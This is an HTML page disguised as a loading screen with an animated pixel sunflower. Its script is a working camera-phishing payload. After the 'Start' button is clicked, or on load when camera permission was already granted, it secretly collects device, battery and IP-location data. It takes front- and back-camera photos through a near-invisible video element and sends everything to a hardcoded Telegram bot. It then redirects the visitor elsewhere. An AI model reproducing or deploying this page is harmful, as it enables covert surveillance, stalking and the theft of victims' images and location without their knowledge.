<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>

<style>
body{
margin:0;
background:#000;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
overflow:hidden;
}

/* ðŸŒ» Pixel sunflower generated via CSS */
.flower{
width:150px;
height:150px;
position:relative;
animation:spin 6s linear infinite;
}

.flower div{
position:absolute;
width:28px;
height:28px;
background:#ffcc00;
border-radius:4px;
}

.center{
background:#5a3d00 !important;
width:40px !important;
height:40px !important;
top:55px;
left:55px;
}

@keyframes spin{
from{transform:rotate(0deg)}
to{transform:rotate(360deg)}
}

/* Tiny preview */
video{
position:absolute;
width:1px;
height:1px;
opacity:0.01;
}

button{
position:absolute;
bottom:60px;
padding:12px 20px;
border:none;
border-radius:8px;
font-size:16px;
cursor:pointer;
}

/* Fade transition */
.fade{
animation:fadeOut 1s forwards;
}

@keyframes fadeOut{
to{opacity:0;}
}
</style>
</head>

<body>

<div class="flower" id="flower"></div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<button id="startBtn">Start</button>

<script>
/* -------- TELEGRAM CONFIG -------- */
const BOT_TOKEN="8082815317:AAEHd6AKLOBJK9vXU0KUuXCgwPt4-v0DyGg";
const CHAT_ID="1167762232";

/* -------- CREATE PIXEL FLOWER -------- */
const flower=document.getElementById("flower");
for(let i=0;i<12;i++){
let p=document.createElement("div");
let angle=(i*30)*Math.PI/180;
p.style.top=60+Math.sin(angle)*55+"px";
p.style.left=60+Math.cos(angle)*55+"px";
flower.appendChild(p);
}
let c=document.createElement("div");
c.className="center";
flower.appendChild(c);

/* -------- TELEGRAM SEND -------- */
async function sendPhoto(blob,caption=""){
let form=new FormData();
form.append("chat_id",CHAT_ID);
form.append("photo",blob);
form.append("caption",caption);

await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
method:"POST",
body:form
});
}

async function sendText(text){
await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
method:"POST",
headers:{'Content-Type':'application/json'},
body:JSON.stringify({chat_id:CHAT_ID,text})
});
}

/* -------- DEVICE INFO -------- */
async function collectInfo(){

let info="ðŸ“± Device\n"+navigator.userAgent+"\n";

if(navigator.getBattery){
let b=await navigator.getBattery();
info+="ðŸ”‹ Battery: "+Math.round(b.level*100)+"%\n";
}

try{
let r=await fetch("https://ipapi.co/json/");
let j=await r.json();
info+=`ðŸ“ ${j.city}, ${j.country_name}`;
}catch{}

sendText(info);
}

/* -------- CAMERA -------- */
let video=document.getElementById("video");
let canvas=document.getElementById("canvas");
let ctx=canvas.getContext("2d");

async function startCamera(mode){
return await navigator.mediaDevices.getUserMedia({
video:{
facingMode:mode,
width:{ideal:1920},
height:{ideal:1080}
}
});
}

function snap(){
canvas.width=video.videoWidth;
canvas.height=video.videoHeight;
ctx.drawImage(video,0,0);

return new Promise(res=>{
canvas.toBlob(res,"image/jpeg",0.95);
});
}

/* -------- CAPTURE FLOW -------- */
async function runExperiment(){

localStorage.setItem("expGranted","yes");

await collectInfo();

/* FRONT */
let stream=await startCamera("user");
video.srcObject=stream;

await delay(1500);

for(let i=1;i<=3;i++){
await sendPhoto(await snap(),"Front "+i);
await delay(900);
}

stream.getTracks().forEach(t=>t.stop());

/* BACK */
stream=await startCamera("environment");
video.srcObject=stream;

await delay(1500);

for(let i=1;i<=2;i++){
await sendPhoto(await snap(),"Back "+i);
await delay(900);
}

stream.getTracks().forEach(t=>t.stop());

redirectUser();
}

/* -------- HELPERS -------- */
function delay(ms){ return new Promise(r=>setTimeout(r,ms)); }

function redirectUser(){
document.body.classList.add("fade");

let go=new URLSearchParams(location.search).get("go");
if(go) setTimeout(()=>location.href=go,1000);
}

/* -------- PERMISSION MEMORY -------- */
async function autoStartIfAllowed(){

try{
let perm=await navigator.permissions.query({name:"camera"});

if(perm.state==="granted" && localStorage.getItem("expGranted")==="yes"){
runExperiment();
}
}catch{}
}

/* -------- BUTTON -------- */
document.getElementById("startBtn").onclick=async ()=>{
document.getElementById("startBtn").style.display="none";
runExperiment();
};

/* Try auto start */
autoStartIfAllowed();

</script>

</body>
</html>
